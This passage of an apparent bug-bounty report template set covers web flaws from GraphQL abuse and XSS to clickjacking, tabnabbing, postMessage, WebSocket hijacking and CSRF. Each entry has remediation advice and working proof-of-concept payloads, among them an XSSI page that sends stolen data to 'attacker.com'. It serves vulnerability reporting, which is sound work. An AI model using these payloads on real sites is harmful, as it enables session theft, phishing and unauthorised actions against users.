              "   a. The application allows a user to search for a product using `query { product(id: \"123\") { name price } }`.",
              "   b. Try to inject additional fields into the query for which the user is not explicitly authorized (e.g., `internalCost`, `supplierInfo`).",
              "   c. Example: `query { product(id: \"123\") { name price internalCost supplierInfo } }`.",
              "   d. **[What happened]**: The GraphQL server returns the sensitive `internalCost` and `supplierInfo` fields, which should be restricted.",
              "   e. **[What should happen]**: The GraphQL server should enforce field-level authorization.",
              "3. **[Scenario B: Abuse of Aliases for Data Exfiltration]**",
              "   a. If the API has rate limits per query, try to use aliases to query multiple items or variations in a single query, potentially bypassing rate limits or overwhelming the backend.",
              "   b. Example: `query { user1: user(id: \"1\"){ name }, user2: user(id: \"2\"){ name } }`.",
              "   c. **[What happened]**: Multiple data points are retrieved in one go, exceeding intended limits.",
              "4. **[Scenario C: Injection into Arguments (if dynamic queries are built)]**",
              "   a. If the backend builds parts of the query from user input (e.g., for filtering or sorting), try to inject parts of a query or directives into an argument. Example: `query { products(filter: \"price: { $gt: 100 }\") { name } }` where `$gt` is treated as a literal string by the backend instead of a filter.",
              "   b. **[What happened]**: The backend misinterprets the injected fragment, leading to data exposure or logic bypass.",
              "   c. **[What should happen]**: User input for arguments should be treated as literal values, not query fragments.",
              "5. **[Scenario D: Denial of Service (Excessive Nesting/Resource Consumption)]**",
              "   a. Construct a deeply nested or circular query to consume excessive server resources. Example: `query { user { posts { author { posts { ... } } } } }`.",
              "   b. **[What happened]**: The server's CPU or memory usage spikes, leading to slowdowns or crashes.",
              "   c. **[What should happen]**: Implement query depth limits, complexity analysis, and timeout mechanisms."
            ],
            "proof_of_concept": {
              "request_example": "POST /graphql HTTP/1.1\nHost: api.example.com\nContent-Type: application/json\n\n{\"query\": \"query { product(id: \\\"123\\\") { name price internalCost supplierInfo } }\"}",
              "response_example": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"data\": {\n    \"product\": {\n      \"name\": \"Gadget X\",\n      \"price\": 99.99,\n      \"internalCost\": 50.00,\n      \"supplierInfo\": \"Secret Supplier Ltd.\"\n    }\n  }\n}",
              "notes": "Provide the exact GraphQL query payload. Include the HTTP request and response showing unauthorized data or unexpected behavior. Screenshots of GraphQL playground or client showing the results."
            },
            "impact": "Unauthorized data access (sensitive business data, personal information). Denial of Service (DoS) by overwhelming the server with complex or nested queries. Business logic bypass. Can be used for user enumeration or to understand the backend schema structure without authorization.",
            "remediation_suggestion": "Implement robust authorization checks at the field level (schema-level authorization) to ensure users only access data they are permitted to. Validate and sanitize all user-supplied arguments to prevent injection. Implement query depth limiting and complexity analysis to mitigate DoS attacks. Disable introspection in production environments or restrict it to authorized users. Use rate limiting on the GraphQL endpoint."
          },
          {
            "vulnerability_name": "XSS (Cross-Site Scripting)",
            "summary": "Cross-Site Scripting (XSS) allows an attacker to inject malicious client-side scripts (e.g., JavaScript) into web pages viewed by other users. This can lead to session hijacking, defacement, data theft, or redirection to phishing sites.",
            "severity": "High",
            "target": "[Specify affected asset, e.g., forum.example.com]",
            "url_location": "[Full URL of the vulnerable endpoint, e.g., https://forum.example.com/comments/add]",
            "steps_to_reproduce": [
              "1. Identify an input field where user-supplied data is reflected on a web page without proper encoding (e.g., search box, comment section, profile description, URL parameters).",
              "2. **[Scenario A: Reflected XSS]**",
              "   a. Inject a basic XSS payload into a URL parameter. Example: `https://forum.example.com/search?q=<script>alert(document.domain)</script>`.",
              "   b. **[What happened]**: The `alert` box pops up, confirming client-side script execution. The payload is reflected directly in the HTML response.",
              "   c. **[What should happen]**: The injected script should be properly encoded (e.g., `&lt;script&gt;`) and not executed by the browser.",
              "3. **[Scenario B: Stored XSS]**",
              "   a. Input a malicious XSS payload into a field that stores the data (e.g., comment, username, profile bio). Example: `<script>alert(document.cookie)</script>`.",
              "   b. Submit the input.",
              "   c. **[What happened]**: When another user (or the attacker) views the page where the stored data is rendered, the `alert` box pops up, and the victim's cookies are stolen (if designed to do so).",
              "   d. **[What should happen]**: The stored input should be properly encoded before being rendered on the page for all viewers.",
              "4. **[Scenario C: DOM-based XSS]**",
              "   a. The server's response itself is not vulnerable, but client-side JavaScript on the page takes user-controlled data (e.g., from `location.hash`, `document.URL`, `document.referrer`) and insecurely writes it to the DOM (e.g., using `innerHTML`, `document.write`).",
              "   b. Example: `https://example.com/page#<img src=x onerror=alert(document.domain)>` where `location.hash` is used insecurely.",
              "   c. **[What happened]**: The injected script executes in the victim's browser.",
              "   d. **[What should happen]**: Client-side JavaScript should sanitize all user-controlled data before writing to DOM sinks."
            ],
            "proof_of_concept": {
              "request_example": "GET /search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1\nHost: forum.example.com",
              "response_example": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<p>Your search for: <script>alert(document.domain)</script> returned no results.</p>",
              "notes": "Provide the exact URL (for reflected/DOM XSS) or the input field and value (for stored XSS). Include screenshots of the XSS payload executing (e.g., alert box), and the HTTP request/response clearly showing the reflected payload."
            },
            "impact": "Session hijacking (stealing user cookies/session tokens, leading to account takeover). Sensitive data theft (e.g., credentials, PII). Website defacement. Redirection to phishing sites. Malware distribution. Client-side denial of service.",
            "remediation_suggestion": "Implement context-sensitive output encoding for all user-supplied data before it is reflected on the web page. Use a secure templating engine that automatically escapes output. For DOM-based XSS, sanitize all client-side data before writing it to DOM sinks. Use a Content Security Policy (CSP) as a defense-in-depth measure. Implement strict input validation where appropriate."
          },
          {
            "vulnerability_name": "Server Side XSS",
            "summary": "Server-Side XSS is a type of XSS where the vulnerability lies in the server-side processing of user input before it's rendered to the browser. While the execution is still client-side, the flaw is in the server's templating or rendering logic, distinct from traditional reflected/stored XSS where raw input is returned directly.",
            "severity": "High",
            "target": "[Specify affected asset, e.g., reports.example.com]",
            "url_location": "[Full URL of the vulnerable endpoint, e.g., https://reports.example.com/generate_report?name=]",
            "steps_to_reproduce": [
              "1. Identify an endpoint where user input is processed server-side by a templating engine or rendering component (e.g., personalized reports, PDF generation, email templates, code generation from user input).",
              "2. **[Scenario A: Template Engine Not Escaping Input]**",
              "   a. Input an XSS payload into a parameter that is directly embedded into a server-side template without proper escaping. Example: `name=<script>alert(document.domain)</script>`.",
              "   b. **[What happened]**: The server generates HTML containing the unescaped script. When the browser renders this HTML, the `alert` box pops up.",
              "   c. **[What should happen]**: The server-side template engine should escape HTML special characters from user input by default.",
              "3. **[Scenario B: JSON/YAML/XML to HTML Transformation (SSI-like behavior)]**",
              "   a. If the server takes structured data (JSON/XML) from user input and transforms it into HTML using a server-side process, try injecting HTML/JS into string fields within that data.",
              "   b. **[What happened]**: The server-side transformer renders the malicious HTML/JS into the final output without proper sanitization.",
              "   c. **[What should happen]**: The transformation process should apply context-aware encoding.",
              "4. **[Scenario C: PDF Generation from HTML/JS]**",
              "   a. If the application generates PDFs or images from user-supplied HTML/JavaScript, inject an XSS payload that can execute during the rendering process.",
              "   b. **[What happened]**: The generated PDF/image might contain the result of the JavaScript execution (e.g., text from `alert`, or a modified layout), or cause the rendering engine to interact with external resources.",
              "   c. **[What should happen]**: The server-side rendering engine should sanitize all input."
            ],
            "proof_of_concept": {
              "request_example": "GET /generate_report?name=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1\nHost: reports.example.com",
              "response_example": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<p>Report for user: <script>alert(document.domain)</script></p>",
              "notes": "Provide the exact payload and the HTTP request/response showing the server-generated HTML containing the unescaped script. Screenshots of the browser executing the XSS. Differentiate from SSTI by showing the HTML injection, not template engine code execution."
            },
            "impact": "Same as traditional XSS: session hijacking, sensitive data theft, website defacement, phishing. The risk can be higher if the server is processing high-privilege input or generating content for many users (e.g., reports for all users).",
            "remediation_suggestion": "Ensure all server-side templating engines are configured to automatically escape HTML special characters from user-supplied input. If manual escaping is necessary, apply context-sensitive output encoding. Always sanitize user input before embedding it into server-generated HTML. For PDF/image generation, use libraries that securely handle untrusted input and isolate the rendering process."
          },
          {
            "vulnerability_name": "XSSI (Cross-Site Script Inclusion)",
            "summary": "Cross-Site Script Inclusion (XSSI), also known as JSONP or JavaScript callback data leakage, occurs when an application exposes sensitive data in a JavaScript file or JSONP endpoint without proper Same-Origin Policy enforcement, allowing an attacker to include the script on their malicious site and steal the data.",
            "severity": "Medium",
            "target": "[Specify affected asset, e.g., api.example.com]",
            "url_location": "[Full URL of the vulnerable JSONP/JS endpoint, e.g., https://api.example.com/user_data?callback=jQuery123]",
            "steps_to_reproduce": [
              "1. Identify an endpoint that returns sensitive data (e.g., user profile, account balance, internal configurations) and supports JSONP or directly outputs JSON/JS that's intended to be included as a script.",
              "2. **[Scenario A: JSONP Endpoint Leakage]**",
              "   a. Construct a malicious HTML page on an attacker-controlled domain.",
              "   b. Embed a `<script>` tag in the HTML that points to the vulnerable JSONP endpoint. Example: `<script src=\"https://api.example.com/user_data?callback=parseData\"></script>`.",
              "   c. Define a global JavaScript function `parseData(data)` on the attacker's page to capture the leaked data.",
              "   d. Host this malicious HTML page and trick a logged-in victim into visiting it.",
              "   e. **[What happened]**: The victim's browser makes a cross-origin request to `api.example.com`, receives the sensitive user data wrapped in the `parseData` callback, and the attacker's `parseData` function executes, stealing the data.",
              "   f. **[What should happen]**: JSONP endpoints should restrict access based on `Referer` or use CSRF tokens, or serve data as plain JSON.",
              "3. **[Scenario B: Sensitive Data in a Regular JS File]**",
              "   a. Identify a JavaScript file served by the target domain that contains sensitive, user-specific data (e.g., an inline script with `window.currentUserData = {...}`).",
              "   b. Follow steps 2a-2c, but instead of JSONP, the attacker's page simply includes the vulnerable JS file. The attacker's script then tries to access `window.currentUserData` after the legitimate script loads.",
              "   c. **[What happened]**: The attacker's page successfully reads the sensitive data from the included script.",
              "   d. **[What should happen]**: Sensitive user-specific data should never be exposed in JavaScript files that can be directly included cross-origin. It should be fetched via AJAX with CSRF protection."
            ],
            "proof_of_concept": {
              "attacker_html_example": "<html><body>\n  <script>\n    function parseData(data) {\n      console.log(\"Stolen data:\", data);\n      // Send data to attacker's server\n      fetch('http://attacker.com/steal?data=' + encodeURIComponent(JSON.stringify(data)));\n    }\n  </script>\n  <script src=\"https://api.example.com/user_data?callback=parseData\"></script>\n</body></html>",
              "notes": "Provide the malicious HTML page source. Show network requests from the victim's browser to the vulnerable endpoint and then to the attacker's server. Attacker server logs showing the stolen data. Screenshots of console logs confirming data capture."
            },
            "impact": "Sensitive data leakage (e.g., user IDs, email addresses, personal details, CSRF tokens, API keys). This can lead to account takeover, targeted phishing, or further attacks by revealing internal application structure or data.",
            "remediation_suggestion": "For JSONP endpoints, strictly validate the `Referer` header to ensure requests originate from trusted domains. Implement CSRF tokens for JSONP responses to prevent unauthorized requests. Serve sensitive data as plain JSON (application/json) instead of JSONP, allowing browsers to enforce the Same-Origin Policy. Ensure sensitive data is not hardcoded into JavaScript files that can be included cross-origin."
          },
          {
            "vulnerability_name": "XS-Search (Cross-Site Search)",
            "summary": "XS-Search (Cross-Site Search) exploits side-channel information leakage from search functions or other interactive features to infer sensitive information about a victim user, typically by observing response times or distinct content changes.",
            "severity": "Medium",
            "target": "[Specify affected asset, e.g., mailbox.example.com]",
            "url_location": "[Full URL of the vulnerable search endpoint, e.g., https://mailbox.example.com/search?query=]",
            "steps_to_reproduce": [
              "1. Identify a search endpoint or similar interactive feature that returns a different response (content, status code, or timing) based on whether specific data exists for the logged-in user. This often bypasses CSRF protections.",
              "2. **[Scenario A: Timing-Based Inference (Binary Search)]**",
              "   a. The attacker wants to know if a victim has an email containing a specific keyword (e.g., 'secret').",
              "   b. As an attacker, make a series of cross-site requests to the search endpoint while logged in as a victim (e.g., `<img>` tag, `<link>` tag, `<iframe>`).",
              "   c. For each query, try to infer the existence of a substring by observing response times. Example: `query=secret_` vs. `query=secret_a`.",
              "   d. **[What happened]**: The load time for a query that returns results is consistently longer than one that doesn't, allowing an attacker to infer data character by character using a binary search approach.",
              "   e. **[What should happen]**: Response times should be consistent, regardless of search results, to prevent timing attacks.",
              "3. **[Scenario B: Distinct Content/Error-Based Inference]**",
              "   a. The search endpoint returns a different error message or subtle HTML difference if a specific record exists for the victim (e.g., 'No results found' vs. 'No match found').",
              "   b. As an attacker, make cross-site requests (e.g., via `<img>` tags, `XMLHttpRequest` if CORS allows) and analyze the response size, status code, or a specific string in the HTML.",
              "   c. **[What happened]**: The attacker can infer the existence of sensitive data by analyzing these subtle differences.",
              "   d. **[What should happen]**: Search results and error messages should be generic and not leak information about data existence."
            ],
            "proof_of_concept": {
              "attacker_html_example": "<html><body>\n  <script>\n    function measureTime(query, callback) {\n      const img = new Image();\n      const start = performance.now();\n      img.onload = () => {\n        const end = performance.now();\n        callback(query, end - start);\n      };\n      img.onerror = () => {\n        const end = performance.now();\n        callback(query, end - start);\n      };\n      img.src = `https://mailbox.example.com/search?query=${encodeURIComponent(query)}`;\n    }\n\n    const queries = ['keyword1', 'keyword2', 'nonexistent_keyword'];\n    queries.forEach(q => {\n      measureTime(q, (query, time) => {\n        console.log(`Query '${query}' took ${time}ms`);\n      });\n    });\n  </script>\n</body></html>",
              "notes": "Provide the attacker's HTML/JavaScript to perform the timing attack. Include network tab screenshots showing varying response times for different queries. Detail the specific data being leaked and how the inference works."
            },
            "impact": "Sensitive data leakage (e.g., inferring private messages, contacts, specific events, or even details of personal accounts). This is a privacy violation that can enable highly targeted social engineering or phishing attacks, or aid in further reconnaissance.",
            "remediation_suggestion": "Implement consistent response times for all search queries, regardless of whether results are found. Ensure that error messages and content differences do not reveal information about the existence of data. Consider using a `SameSite` cookie policy (Lax or Strict) to prevent cross-site requests from including session cookies. For very sensitive searches, consider implementing CSRF tokens, even if it's a GET request."
          },
          {
            "vulnerability_name": "Clickjacking",
            "summary": "Clickjacking (UI Redress Attack) tricks a user into clicking on a hidden or disguised UI element (e.g., a button, link) on a malicious website, which actually performs an action on a legitimate, vulnerable website where the user is already authenticated.",
            "severity": "Medium",
            "target": "[Specify affected asset, e.g., bank.example.com]",
            "url_location": "[Full URL of the vulnerable page with sensitive actions, e.g., https://bank.example.com/transfer_funds, https://bank.example.com/change_password]",
            "steps_to_reproduce": [
              "1. Identify a legitimate web page containing a sensitive action (e.g., 'Confirm Transfer', 'Change Password', 'Make Purchase') that does not implement X-Frame-Options or Content-Security-Policy: frame-ancestors.",
              "2. **[Scenario A: Overlay Attack]**",
              "   a. Create an attacker-controlled HTML page.",
              "   b. Embed the legitimate, vulnerable page as an `<iframe>` on the attacker's page.",
              "   c. Position the `<iframe>` using CSS (e.g., `position: absolute; left: 0; top: 0; width: 100%; height: 100%; opacity: 0; z-index: 100;`) to make it completely transparent and overlay it precisely over a deceptive button or link on the attacker's page.",
              "   d. Design the attacker's page to entice the user to click where the sensitive action button is underneath the transparent `<iframe>`.",
              "   e. **[What happened]**: The victim, thinking they are clicking on the attacker's button, actually clicks the hidden button on the legitimate site, performing the unintended action (e.g., making a transfer).",
              "   f. **[What should happen]**: The legitimate page should prevent itself from being framed by other domains.",
              "3. **[Scenario B: Cursor Tracking/Drag-and-Drop Hijacking]**",
              "   a. Similar to the overlay attack, but potentially using JavaScript to track the user's cursor movement or exploit drag-and-drop functionalities if the target allows it."
            ],
            "proof_of_concept": {
              "attacker_html_example": "<html>\n<head><title>Free Money Now!</title></head>\n<body>\n  <h1>Get your free money! Click here!</h1>\n  <div style=\"position: relative; width: 300px; height: 100px;\">\n    <iframe src=\"https://bank.example.com/transfer_funds\" style=\"position: absolute; left: -100px; top: -50px; width: 500px; height: 300px; opacity: 0.0001; z-index: 100;\"></iframe>\n    <button style=\"width: 300px; height: 100px; background-color: blue; color: white; font-size: 24px;\">CLICK HERE FOR FREE MONEY!</button>\n  </div>\n</body>\n</html>",
              "notes": "Provide the malicious HTML code for the attacker's page. Screenshots or a video demonstrating the user clicking the deceptive button and the action being performed on the legitimate site without the user's explicit intent."
            },
            "impact": "Unauthorized actions performed on behalf of the victim (e.g., fund transfers, password changes, account settings modification, social media posts). This can lead to financial loss, account compromise, reputational damage, and privacy breaches.",
            "remediation_suggestion": "Implement the `X-Frame-Options` HTTP response header with `DENY` or `SAMEORIGIN` to prevent framing by other domains. Alternatively, use a Content Security Policy (CSP) with the `frame-ancestors` directive (e.g., `Content-Security-Policy: frame-ancestors 'self';`). Implement 'frame-busting' JavaScript, but note that this is less reliable than HTTP headers. For sensitive actions, require re-authentication or a multi-step confirmation process that cannot be easily hidden."
          },
              {
                "vulnerability_name": "Reverse Tab Nabbing",
                "summary": "Reverse Tab Nabbing (also known as Tabnabbing or Tab-Under) exploits the `window.opener` JavaScript property in conjunction with `target=\"_blank\"` links. When a user clicks a link that opens in a new tab, the original tab can be silently redirected to a malicious phishing page, making the user believe the legitimate site was compromised.",
                "severity": "Low",
                "target": "[Specify affected asset, e.g., blog.example.com]",
                "url_location": "[Full URL of a page with external links using target=\"_blank\", e.g., https://blog.example.com/article/123]",
                "steps_to_reproduce": [
                  "1. Identify an external link on the target application that uses `target=\"_blank\"` without `rel=\"noopener\"` or `rel=\"noreferrer\"` (e.g., a link to a social media site, an external resource).",
                  "2. Create an attacker-controlled HTML page that hosts a malicious phishing site (e.g., a fake login page for the legitimate application).",
                  "3. On the attacker's page, include JavaScript that attempts to redirect the `window.opener` to the malicious site. Example: `window.opener.location.replace(\"http://attacker.com/phishing_login\");`",
                  "4. **[What happened]**: When a user clicks the `target=\"_blank\"` link on the legitimate `blog.example.com` page, a new tab opens (as expected), but the *original* `blog.example.com` tab silently redirects to `http://attacker.com/phishing_login`.",
                  "5. **[What should happen]**: The original tab should remain on the legitimate page, unaffected by the newly opened tab.",
                  "6. The user, seeing the original tab now showing a login page (which looks legitimate), might enter their credentials, leading to compromise."
                ],
                "proof_of_concept": {
                  "attacker_html_example": "<html>\n<head><title>Malicious Site</title></head>\n<body>\n  <h1>Welcome to the new tab!</h1>\n  <script>\n    if (window.opener) {\n      window.opener.location.replace(\"http://phishing.example.com/login\");\n    }\n  </script>\n  <p>Enjoy your browsing.</p>\n</body>\n</html>",
                  "notes": "Provide the URL of the vulnerable link on the target application. Include screenshots or a video demonstrating the original tab silently redirecting to the attacker's phishing page after clicking the link."
                },
                "impact": "Phishing attacks, where users are tricked into entering credentials on a fake site that appears to be the legitimate one. This can lead to account compromise, sensitive data theft, and reputational damage for the legitimate application.",
                "remediation_suggestion": "For all external links that use `target=\"_blank\"`, add the `rel=\"noopener noreferrer\"` attributes. `noopener` prevents the new tab from accessing `window.opener`. `noreferrer` prevents the `Referer` header from being sent to the new tab, adding an extra layer of privacy and security."
              },
              {
                "vulnerability_name": "Content Security Policy bypass",
                "summary": "A Content Security Policy (CSP) bypass allows an attacker to circumvent the security restrictions imposed by the CSP, typically enabling Cross-Site Scripting (XSS) even when the policy is seemingly robust.",
                "severity": "High",
                "target": "[Specify affected asset, e.g., app.example.com]",
                "url_location": "[Full URL of the page with the CSP, e.g., https://app.example.com/dashboard]",
                "steps_to_reproduce": [
                  "1. Identify a page that implements a Content Security Policy (CSP) by inspecting the `Content-Security-Policy` HTTP header or a `<meta>` tag.",
                  "2. Analyze the CSP directives (e.g., `script-src`, `object-src`, `default-src`, `unsafe-inline`, `unsafe-eval`).",
                  "3. **[Scenario A: `unsafe-inline` or `unsafe-eval` present]**",
                  "   a. If `script-src` includes `unsafe-inline` or `unsafe-eval`, or if a nonce/hash is not properly implemented, try injecting inline `<script>` tags or `eval()` calls via a reflected XSS vulnerability.",
                  "   b. **[What happened]**: The inline script or `eval()` executes, bypassing the CSP.",
                  "   c. **[What should happen]**: CSP should ideally not include `unsafe-inline` or `unsafe-eval`.",
                  "4. **[Scenario B: Whitelisted Domain Bypass (JSONP/AngularJS/CDN)]**",
                  "   a. If `script-src` whitelists a domain that hosts a JSONP endpoint, a vulnerable AngularJS library, or an open redirect.",
                  "   b. Inject a payload that leverages this whitelisted domain. Example: `<script src=\"https://whitelisted-cdn.com/jsonp?callback=alert(document.domain)\"></script>`.",
                  "   c. **[What happened]**: The script from the whitelisted domain executes the injected payload, bypassing the CSP.",
                  "   d. **[What should happen]**: Whitelisted domains should be carefully chosen and not host vulnerabilities that can be leveraged for CSP bypass.",
                  "5. **[Scenario C: Reflected XSS into `base-uri` or `report-uri` (less common)]**",
                  "   a. If user input is reflected into the `base-uri` or `report-uri` directives of the CSP, try to inject a malicious URL.",
                  "   b. **[What happened]**: The CSP itself is manipulated to allow further attacks or leak data.",
                  "6. **[Scenario D: Missing Directives / Lax Policy]**",
                  "   a. If directives like `object-src`, `base-uri`, `frame-src`, `worker-src` are missing or set to `*` or `data:`, try to load malicious content through these vectors (e.g., Flash objects, iframes, Web Workers).",
                  "   b. **[What happened]**: The missing/lax directive allows the malicious content to load and execute.",
                  "   c. **[What should happen]**: CSP should be comprehensive and restrict all possible execution contexts."
                ],
                "proof_of_concept": {
                  "csp_header_example": "Content-Security-Policy: script-src 'self' https://whitelisted-cdn.com;",
                  "request_example": "GET /search?q=%3Cscript%20src%3D%22https%3A%2F%2Fwhitelisted-cdn.com%2Fjsonp%3Fcallback%3Dalert(document.domain)%22%3E%3C%2Fscript%3E HTTP/1.1\nHost: app.example.com",
                  "notes": "Provide the full CSP header/meta tag. Show the exact XSS payload used. Include screenshots of the XSS payload executing (e.g., alert box) despite the CSP, and network tab showing the request to the whitelisted domain."
                },
                "impact": "Cross-Site Scripting (XSS), leading to session hijacking, sensitive data theft, defacement, and phishing, even when a CSP is present. This undermines the defense-in-depth provided by CSP and can lead to critical vulnerabilities.",
                "remediation_suggestion": "Design a strict CSP that follows best practices, avoiding `unsafe-inline` and `unsafe-eval`. Use nonces or hashes for inline scripts. Carefully audit all whitelisted domains to ensure they do not host vulnerabilities (e.g., JSONP endpoints, vulnerable libraries, open redirects) that can be leveraged for CSP bypass. Ensure all directives are present and restrict all possible execution contexts. Regularly review and update CSP as the application evolves."
              },
              {
                "vulnerability_name": "PostMessage Vulnerabilities",
                "summary": "PostMessage vulnerabilities occur when an application uses the `window.postMessage()` API insecurely, allowing an attacker to send or receive malicious messages across different origins, leading to information disclosure, XSS, or unauthorized actions.",
                "severity": "Medium",
                "target": "[Specify affected asset, e.g., app.example.com (parent window) and widget.example.com (iframe)]",
                "url_location": "[Full URL of the page sending/receiving postMessages, e.g., https://app.example.com/dashboard (parent) or https://widget.example.com/embed (iframe)]",
                "steps_to_reproduce": [
                  "1. Identify an application that uses `window.postMessage()` for cross-origin communication (e.g., iframes, pop-up windows, embedded widgets).",
                  "2. **[Scenario A: Missing Origin Validation (Receiver Side)]**",
                  "   a. The legitimate application (e.g., `app.example.com`) embeds an iframe from `widget.example.com` and expects messages from it.",
                  "   b. Create an attacker-controlled HTML page on `attacker.com`.",
                  "   c. Embed the vulnerable `app.example.com` page as an iframe on `attacker.com`.",
                  "   d. From `attacker.com`, use `postMessage()` to send a malicious message to the iframe (or the parent window) without validating the `targetOrigin` or `event.origin`.",
                  "   e. Example (from `attacker.com` to `app.example.com` iframe): `iframe.contentWindow.postMessage('{\"action\":\"transfer\",\"amount\":1000}', '*');`",
                  "   f. **[What happened]**: The `app.example.com` page processes the malicious message from `attacker.com`, performing an unauthorized action (e.g., initiating a transfer).",
                  "   g. **[What should happen]**: The receiving window/iframe should always validate `event.origin` to ensure the message comes from a trusted source.",
                  "3. **[Scenario B: Missing Origin Validation (Sender Side)]**",
                  "   a. The legitimate application (`app.example.com`) sends sensitive data via `postMessage()` to an embedded iframe, but uses `targetOrigin='*'` or a wildcard, or doesn't validate the destination origin.",
                  "   b. Create an attacker-controlled HTML page on `attacker.com`.",
                  "   c. Embed the vulnerable `app.example.com` page as an iframe on `attacker.com`.",
                  "   d. The `app.example.com` page attempts to send a message to its embedded iframe. However, since it's embedded in `attacker.com`, the message might be intercepted or redirected.",
                  "   e. **[What happened]**: Sensitive data is sent to the attacker's domain.",
                  "   f. **[What should happen]**: The sending window/iframe should always specify a precise `targetOrigin` (not `*`) and validate the destination.",
                  "4. **[Scenario C: XSS via PostMessage]**",
                  "   a. If the received message content is directly used in a DOM sink (e.g., `innerHTML`) without sanitization.",
                  "   b. Send a message with an XSS payload: `postMessage('<img src=x onerror=alert(document.domain)>', 'https://trusted.origin.com');`.",
                  "   c. **[What happened]**: The XSS payload executes on the legitimate domain.",
                  "   d. **[What should happen]**: All data received via `postMessage()` should be sanitized before use in DOM sinks."
                ],
                "proof_of_concept": {
                  "attacker_html_example": "<html><body>\n  <iframe id=\"vulnerableFrame\" src=\"https://app.example.com/dashboard\"></iframe>\n  <script>\n    document.getElementById('vulnerableFrame').onload = function() {\n      document.getElementById('vulnerableFrame').contentWindow.postMessage('{\"action\":\"transfer\",\"amount\":1000}', '*');\n      console.log(\"Message sent to vulnerable iframe.\");\n    };\n  </script>\n</body></html>",
                  "notes": "Provide the malicious HTML page source. Screenshots or a video demonstrating the unauthorized action being performed (e.g., transfer initiated, data leaked, XSS alert). Show the `postMessage` call and the lack of origin validation in the target application's code (if discoverable)."
                },
                "impact": "Cross-Site Scripting (XSS), leading to session hijacking and data theft. Unauthorized actions on behalf of the user (e.g., fund transfers, password changes). Sensitive data leakage to untrusted origins. This undermines the Same-Origin Policy and can lead to severe security breaches.",
                "remediation_suggestion": "Always validate the `event.origin` property on the receiving side of `postMessage()` to ensure the message comes from a trusted domain. Always specify a precise `targetOrigin` (not `*`) when sending `postMessage()`. Sanitize all received message data before using it in DOM sinks or performing sensitive operations. Implement strict input validation for message content."
              },
              {
                "vulnerability_name": "Cross-site WebSocket hijacking (CSWSH)",
                "summary": "Cross-site WebSocket Hijacking (CSWSH) allows an attacker to control a victim's WebSocket connection to a legitimate application. By tricking a victim into visiting a malicious page, the attacker can initiate requests through the victim's browser and interact with the WebSocket server on their behalf, leading to unauthorized actions or information disclosure.",
                "severity": "High",
                "target": "[Specify affected asset, e.g., chat.example.com]",
                "url_location": "[Full WebSocket URL, e.g., wss://chat.example.com/websocket]",
                "steps_to_reproduce": [
                  "1. Identify an application that uses WebSockets for authenticated communication and does not implement proper CSRF protection for WebSocket handshake or messages.",
                  "2. **[Scenario A: Missing Origin Validation on WebSocket Handshake]**",
                  "   a. Create an attacker-controlled HTML page on `attacker.com`.",
                  "   b. On the attacker's page, use JavaScript to initiate a WebSocket connection to the legitimate, vulnerable WebSocket endpoint. Example: `new WebSocket('wss://chat.example.com/websocket');`",
                  "   c. **[What happened]**: The WebSocket connection is successfully established from `attacker.com`, even though the `Origin` header is different from the legitimate site. The attacker can now send/receive messages through the victim's browser.",
                  "   d. **[What should happen]**: The WebSocket server should validate the `Origin` header during the handshake to ensure it comes from a trusted domain.",
                  "3. **[Scenario B: Missing CSRF Token for WebSocket Messages]**",
                  "   a. If the WebSocket connection is established, try sending messages that perform sensitive actions (e.g., sending chat messages, changing settings, making purchases) without including a CSRF token.",
                  "   b. Example: `ws.send('{\"action\":\"send_message\",\"content\":\"Malicious message!\"}');`",
                  "   c. **[What happened]**: The malicious message is sent or the sensitive action is performed on behalf of the victim.",
                  "   d. **[What should happen]**: WebSocket messages that trigger sensitive actions should be protected with CSRF tokens.",
                  "4. **[Scenario C: Information Disclosure via WebSocket]**",
                  "   a. If the WebSocket connection can be hijacked, and the server sends sensitive data over the WebSocket, the attacker can listen for these messages.",
                  "   b. Example: `ws.onmessage = function(event) { console.log(\"Stolen data:\", event.data); };`.",
                  "   c. **[What happened]**: The attacker's page receives sensitive data intended for the victim."
                ],
                "proof_of_concept": {
                  "attacker_html_example": "<html><body>\n  <script>\n    const ws = new WebSocket('wss://chat.example.com/websocket');\n    ws.onopen = function() {\n      console.log('WebSocket connected!');\n      // Send a malicious message to the chat server\n      ws.send(JSON.stringify({ action: 'send_message', content: 'You have been hacked!' }));\n    };\n    ws.onmessage = function(event) {\n      console.log('Received:', event.data);\n    };\n    ws.onerror = function(error) {\n      console.error('WebSocket Error:', error);\n    };\n  </script>\n</body></html>",
                  "notes": "Provide the malicious HTML page source. Screenshots or a video demonstrating the WebSocket connection being established from the attacker's domain and the unauthorized action being performed (e.g., malicious message appearing in chat, data logged in attacker's console). Include network tab showing the WebSocket handshake and messages."
                },
                "impact": "Unauthorized actions performed on behalf of the victim (e.g., sending messages, making purchases, changing settings). Sensitive data leakage if the WebSocket transmits private information. Can lead to account takeover or social engineering attacks. This bypasses the Same-Origin Policy for WebSocket communication.",
                "remediation_suggestion": "Validate the `Origin` header during the WebSocket handshake on the server-side to ensure the connection originates from a trusted domain. Implement CSRF tokens for all WebSocket messages that trigger sensitive actions. Ensure sensitive data is not transmitted over WebSockets without proper authorization checks. Use `SameSite=Strict` for session cookies to prevent them from being sent with cross-site WebSocket handshakes."
              },
              {
                "vulnerability_name": "Cross Site Request Forgery (CSRF)",
                "summary": "Cross-Site Request Forgery (CSRF) tricks an authenticated victim into unknowingly submitting a malicious request to a legitimate web application. This allows an attacker to perform actions on behalf of the victim without their consent (e.g., change password, make a purchase, transfer funds).",
                "severity": "High",
                "target": "[Specify affected asset, e.g., bank.example.com]",
                "url_location": "[Full URL of the vulnerable endpoint with sensitive action, e.g., https://bank.example.com/transfer_funds]",
                "steps_to_reproduce": [
                  "1. Identify a sensitive action that is performed via an HTTP request (e.g., POST, GET, PUT) and does not require a CSRF token (or the token is easily predictable/reusable). Examples: changing password, making a transfer, deleting an account, submitting a form.",
                  "2. **[Scenario A: CSRF via GET Request]**",
                  "   a. The application performs a sensitive action via a GET request (e.g., `GET /transfer?to=attacker&amount=100`).",
                  "   b. Create a malicious HTML page on `attacker.com` with an `<img>` tag or a simple `<a>` link pointing to this GET request. Example: `<img src=\"https://bank.example.com/transfer?to=attacker&amount=100\">`.",
                  "   c. Trick an authenticated victim into visiting `attacker.com`.",
